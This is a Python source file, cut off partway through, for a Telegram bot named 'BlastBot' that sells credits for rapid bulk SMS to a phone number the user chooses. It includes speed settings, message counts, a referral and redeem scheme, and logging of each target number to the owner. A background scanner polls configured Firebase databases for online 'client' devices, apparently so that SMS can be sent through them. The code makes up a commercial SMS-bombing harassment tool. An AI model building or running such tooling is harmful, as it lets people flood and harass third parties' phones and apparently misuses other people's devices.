import asyncio, json, os, time, logging, random, string, threading, sqlite3, tempfile
from html import escape
from datetime import datetime
from copy import deepcopy
from collections import defaultdict

import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile,
    ErrorEvent
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== NORMAL UNICODE EMOJIS ==========
# Premium Telegram custom-emoji IDs intentionally disabled.
EMOJI_FIRE = None
EMOJI_STAR = None
EMOJI_ROCKET = None
EMOJI_CROWN = None
EMOJI_SHIELD = None
EMOJI_MONEY = None
EMOJI_PHONE = None
EMOJI_CHECK = None
EMOJI_CROSS = None
EMOJI_WARNING = None
EMOJI_LOCK = None
EMOJI_GIFT = None
EMOJI_BELL = None
EMOJI_GEAR = None
EMOJI_VIDEO = None

# Premium message effects disabled; normal text emoji is used instead.
FIRE_EFFECT_ID = None

DIVIDER = "__________________________________________________________"
POWERED_BY = "Powered by ~ @ALRICES"
SHORT_MESSAGE_NOTE = "✨ Thank you for using the bot.\n👇 Please choose an option below to continue."


async def react_to_start(bot: Bot, msg: Message):
    """Best-effort 🎉 reaction; unsupported Telegram clients are ignored safely."""
    try:
        from aiogram.types import ReactionTypeEmoji
        await bot.set_message_reaction(
            chat_id=msg.chat.id, message_id=msg.message_id,
            reaction=[ReactionTypeEmoji(emoji="🎉")]
        )
    except Exception as e:
        log.debug("Start reaction unavailable: %s", e)


def _blockquote_text(text):
    """Apply the standard two-line header/footer and Telegram blockquote styling."""
    if not isinstance(text, str) or not text.strip():
        return text
    if text.lstrip().startswith("<blockquote>") and text.rstrip().endswith("</blockquote>"):
        return text
    # Keep ordinary UI replies spacious and readable without padding broadcasts/logs.
    excluded = ("BROADCAST", "NEW SMS REQUEST", "ANALYTICS DASHBOARD", "OWNER PANEL", "ADMIN PANEL")
    body = text.strip()
    if body.count("\n") < 3 and not any(marker in body.upper() for marker in excluded):
        body = f"{body}\n{SHORT_MESSAGE_NOTE}"
    formatted = (
        f"{DIVIDER}\n{DIVIDER}\n"
        f"{body}\n"
        f"{DIVIDER}\n{POWERED_BY}"
    )
    return f"<blockquote>{formatted}</blockquote>"


class QuotedBot(Bot):
    """Bot client that consistently renders outgoing text as blockquotes."""

    async def send_message(self, chat_id, text, *args, **kwargs):
        return await super().send_message(chat_id, _blockquote_text(text), *args, **kwargs)

    async def edit_message_text(self, text, *args, **kwargs):
        return await super().edit_message_text(_blockquote_text(text), *args, **kwargs)

    async def send_photo(self, chat_id, photo, *args, **kwargs):
        if kwargs.get("caption"):
            kwargs["caption"] = _blockquote_text(kwargs["caption"])
        return await super().send_photo(chat_id, photo, *args, **kwargs)

    async def send_video(self, chat_id, video, *args, **kwargs):
        if kwargs.get("caption"):
            kwargs["caption"] = _blockquote_text(kwargs["caption"])
        return await super().send_video(chat_id, video, *args, **kwargs)


SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    """Render text in the requested style: first letter normal, rest small-caps."""
    if not isinstance(text, str):
        return text
    for index, char in enumerate(text):
        if char.isalpha():
            return text[:index] + char.upper() + text[index + 1:].translate(SMALL_CAPS_MAP)
    return text

def em(emoji_id: str, fallback: str = "⭐") -> str:
    """Return a regular Unicode emoji; Telegram custom emojis are disabled."""
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    """Colorful inline button with regular Unicode emoji."""
    label = sc(text)
    if fallback_emoji and not emoji_id:
        label = f"{fallback_emoji} {label}"
    kwargs = {"text": label, "callback_data": callback_data}
    if style:
        kwargs["style"] = style
    try:
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        # Fallback agar aiogram purani version ho
        fallback_kwargs = {"text": f"{fallback_emoji} {sc(text)}".strip(), "callback_data": callback_data}
        return InlineKeyboardButton(**fallback_kwargs)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    label = sc(text)
    if fallback_emoji and not emoji_id:
        label = f"{fallback_emoji} {label}"
    kwargs = {"text": label, "url": url}
    if style:
        kwargs["style"] = style
    try:
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        fallback_kwargs = {"text": f"{fallback_emoji} {sc(text)}".strip(), "url": url}
        return InlineKeyboardButton(**fallback_kwargs)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    kb_btn = KeyboardButton(text=text, request_contact=request_contact, request_location=request_location)
    try:
        setattr(kb_btn, "style", style)
    except Exception:
        pass
    return kb_btn

def default_reply_keyboard(uid: int = None, d: dict = None) -> ReplyKeyboardMarkup:
    """Reply keyboard — neeche wale buttons. Admin/Owner ko extra panel button."""
    rows = [
        [style_btn("🚀 Send SMS", style="success"), style_btn("👤 Profile", style="primary")],
        [style_btn("🎁 Refer & Earn", style="primary"), style_btn("🎟 Redeem", style="success")],
        [style_btn("💰 Buy Credit", style="success"), style_btn("💎 Premium Plans", style="primary")],
        [style_btn("📊 Status", style="primary"), style_btn("🆘 Support", style="danger")],
    ]
    if uid and d:
        if is_owner(uid, d):
            rows.append([style_btn("👑 OWNER PANEL", style="danger")])
        elif is_admin(uid, d):
            rows.append([style_btn("🛡 ADMIN PANEL", style="danger")])
    return ReplyKeyboardMarkup(
        keyboard=rows,
        resize_keyboard=True,
        is_persistent=True
    )

def _env_int(name: str, default: int = 0) -> int:
    try:
        return int(os.getenv(name, str(default)).strip())
    except (TypeError, ValueError):
        return default


MAIN_OWNER = _env_int("MAIN_OWNER_ID", 8790645158)
OWNER_NAME = os.getenv("OWNER_NAME", "Owner")
OWNER_LINK = os.getenv("OWNER_LINK", "")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
BOT_USERNAME = os.getenv("BOT_USERNAME", "Erenxsmsbot")
# Log channel is configured privately from Owner Panel settings.
_DATA_DIR = os.getenv("DATA_DIR", ".")
os.makedirs(_DATA_DIR, exist_ok=True)
_DATA_FILE = os.path.join(_DATA_DIR, "blast_data.json")
_DB_FILE = os.path.join(_DATA_DIR, "blast_data.sqlite3")
_VERSION = "v3.4-NORMAL-EMOJI"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 60.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM


async def send_fire_effect_private(bot: Bot, chat_id: int):
    if not FIRE_EFFECT_ID:
        return
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")


async def send_channel_log(bot: Bot, text: str, chat_id=None):
    try:
        configured = load().get("settings", {}).get("sms_log_chat_id")
        target = chat_id if chat_id is not None else configured
        if target:
            await bot.send_message(target, text, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")


def sms_log_target(d: dict):
    return d.get("settings", {}).get("sms_log_chat_id")


async def log_sms_number_entry(bot: Bot, msg: Message, number: str, source: str = "user"):
    d = load()
    target = sms_log_target(d)
    if not target:
        return
    user = msg.from_user
    name = escape(user.full_name or "Unknown")
    username = f"@{escape(user.username)}" if user.username else "—"
    safe_number = escape(number)
    link = d.get("settings", {}).get("sms_log_link", "")
    destination = f"\n🔗 <a href=\"{escape(link, quote=True)}\">Open log channel</a>" if link else ""
    text = (
        f"{DIVIDER}\n"
        f"📥 <b>NEW SMS REQUEST</b>\n"
        f"{DIVIDER}\n"
        f"👤 <b>Name:</b> {name}\n"
        f"🌐 <b>Username:</b> {username}\n"
        f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
        f"📞 <b>Number:</b> <code>{safe_number}</code>\n"
        f"🏷 <b>Source:</b> {escape(source)}\n"
        f"🕒 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        f"{destination}\n"
        f"{DIVIDER}"
    )
    await send_channel_log(bot, text, target)


class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None


USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}


class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    set_sms_log = State()
    manage_user_credits = State()
    search_user_balance = State()


def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 5},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 5, "max_owners": 6, "sms_log_chat_id": None, "sms_log_link": ""},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "images": []
    }


def _normalize_data(data: dict) -> dict:
    """Apply defaults and safe migrations to data loaded from any backend."""
    default = _default_data()
    for k, v in default.items():
        if k not in data:
            data[k] = deepcopy(v)
    # Single-owner mode: discard legacy extra owners/admins on every load.
    data["owners"] = [MAIN_OWNER]
    data["admins"] = []
    # Migrate the old built-in referral reward to the new 5-credit rule.
    if data.get("settings", {}).get("ref_credits") == 3:
        data["settings"]["ref_credits"] = 5
    if data.get("premium", {}).get("ref_credits") == 3:
        data["premium"]["ref_credits"] = 5
    for uid_str, u in data.get("users", {}).items():
        u.setdefault("credits", 0)
        u.setdefault("username", "")
        u.setdefault("sms_used", 0)
        u.setdefault("sms_history", [])
    return data


def _db_connect():
    conn = sqlite3.connect(_DB_FILE, timeout=15)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=FULL")
    conn.execute("CREATE TABLE IF NOT EXISTS bot_state (id INTEGER PRIMARY KEY CHECK (id = 1), payload TEXT NOT NULL, updated_at INTEGER NOT NULL)")
    return conn


def load() -> dict:
    """Load state from SQLite, migrating the legacy JSON file once if needed."""
    global PROTECTED_NUMBERS
    try:
        with _db_connect() as conn:
            row = conn.execute("SELECT payload FROM bot_state WHERE id = 1").fetchone()
        if row and row[0]:
            data = _normalize_data(json.loads(row[0]))
            PROTECTED_NUMBERS = data.get("protected_numbers", {})
            return data
    except Exception as e:
        log.exception("SQLite load error: %s", e)

    # One-time migration path from the old JSON store.
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = _normalize_data(json.load(f))
            save(data)
            PROTECTED_NUMBERS = data.get("protected_numbers", {})
            log.info("Migrated legacy JSON data into SQLite persistence")
            return data
        except Exception as e:
            log.exception("Legacy JSON migration error: %s", e)

    data = _normalize_data(_default_data())
    save(data)
    PROTECTED_NUMBERS = data.get("protected_numbers", {})
    return data


def save(d: dict):
    """Atomically persist the complete bot state in SQLite and a JSON backup."""
    payload = json.dumps(_normalize_data(deepcopy(d)), ensure_ascii=False, separators=(",", ":"))
    now = int(time.time())
    try:
        with _db_connect() as conn:
            conn.execute("BEGIN IMMEDIATE")
            conn.execute("INSERT INTO bot_state(id, payload, updated_at) VALUES(1, ?, ?) ON CONFLICT(id) DO UPDATE SET payload=excluded.payload, updated_at=excluded.updated_at", (payload, now))
            conn.commit()
    except Exception:
        log.exception("SQLite save error")
        raise

    # Keep a human-readable backup without exposing a partially written file.
    try:
        directory = os.path.dirname(os.path.abspath(_DATA_FILE)) or "."
        fd, tmp_name = tempfile.mkstemp(prefix="blast_data_", suffix=".tmp", dir=directory)
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            json.dump(json.loads(payload), f, indent=2, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_name, _DATA_FILE)
    except Exception:
        log.exception("JSON backup save error; SQLite data is still safe")


def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "username": "", "uses": 0, "credits": 0, "sms_used": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False


def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]


def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER


def is_owner(uid: int, d: dict) -> bool:
    return uid == MAIN_OWNER


def is_admin(uid: int, d: dict) -> bool:
    # Admin-only legacy handlers remain reachable by the owner, never by a separate admin.
    return is_owner(uid, d)


def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])


def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False


def role_tag(uid: int, d: dict) -> str:
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '👑')} ᴏᴡɴᴇʀ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"


def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)


def find_user_id(ref: str, d: dict):
    """Resolve a Telegram numeric ID or stored @username to a user ID."""
    ref = (ref or "").strip()
    if ref.startswith("@"):
        wanted = ref[1:].lower()
        for uid_str, user in d.get("users", {}).items():
            if str(user.get("username", "")).lstrip("@").lower() == wanted:
                return int(uid_str)
        return None
    try:
        uid = int(ref)
    except (TypeError, ValueError):
        return None
    return uid if str(uid) in d.get("users", {}) else None


def user_balance_text(uid: int, d: dict) -> str:
    user = d.get("users", {}).get(str(uid), {})
    name = escape(user.get("name", "Unknown"))
    username = escape(user.get("username", "")) or "—"
    credits = get_user_credits(uid, d)
    sms_left = get_sms_capacity(uid, d)
    return (
        f"{DIVIDER}\n💰 <b>USER BALANCE</b>\n{DIVIDER}\n\n"
        f"👤 <b>Name:</b> {name}\n🌐 <b>Username:</b> {username}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"💳 <b>Credits:</b> <b>{credits}</b>\n"
        f"📤 <b>SMS quota left:</b> <b>{sms_left}</b>\n"
        f"<i>1 credit = 10 SMS</i>\n{DIVIDER}"
    )


def get_sms_capacity(uid: int, d: dict) -> int:
    """Return remaining SMS quota: 1 credit grants 10 SMS."""
    user = d.get("users", {}).get(str(uid), {})
    credits = max(0, int(user.get("credits", 0)))
    used = max(0, int(user.get("sms_used", 0)))
    return max(0, credits * 10 - used)


def record_sms_success(uid: int, d: dict) -> int:
    """Record one successful SMS and consume one credit after every 10 SMS."""
    user = d.setdefault("users", {}).setdefault(str(uid), {})
    user["sms_used"] = max(0, int(user.get("sms_used", 0))) + 1
    consumed = user["sms_used"] // 10
    if consumed:
        user["credits"] = max(0, int(user.get("credits", 0)) - consumed)
        user["sms_used"] %= 10
    return consumed


def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount


def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False


def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code


def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 5)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid


async def send_random_media(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    media = [("video", item) for item in d.get("videos", [])]
    media += [("photo", item) for item in d.get("images", [])]
    if not media:
        return
    media_type, media_item = random.choice(media)
    try:
        if media_type == "photo":
            await bot.send_photo(chat_id, photo=media_item, caption=caption, parse_mode="HTML")
        else:
            await bot.send_video(chat_id, video=media_item, caption=caption, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send dashboard media: {e}")


async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    # Backward-compatible wrapper for any existing call sites.
    await send_random_media(bot, chat_id, caption)


def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])


def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="success"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="primary"),
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")]
    ])


def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)


def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)


def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])


def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]


def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME
    if time_diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
    elif time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"
    else:
        return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴏʟᴅ)"


async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG
    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False
    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True
        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()
        try:
            d = load()
            fbs = d.get("firebases", [])
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue
            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan
            CACHED_DEVICES = devices
            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label, "online": fb_online, "last_update": int(time.time())
                }
            LAST_SCAN_TIME = time.time()
            health_entry = {
                "timestamp": int(time.time()), "devices_found": len(devices),
                "dbs_scanned": len(fbs), "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]
            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")
                current_fb_ids = {fb["id"] for fb in fbs}
                stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                for stale in stale_fb_ids:
                    FB_DEVICE_COUNTS.pop(stale, None)
                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ-sᴄᴀɴ: ᴇᴠᴇʀʏ <b>1 ᴍɪɴᴜᴛᴇ</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇ: <b>{scan_duration:.1f}s</b>\n\n"
                            f"<i>{sc('bot is now running in ultra mode with per-user sessions.')}</i>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        log.warning(f"Owner notify failed: {e}")
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)


def get_cached_devices() -> list:
    return CACHED_DEVICES


async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}


async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False


def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])


async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict):
                        return

                    async def fetch_dev(dev_id: str):
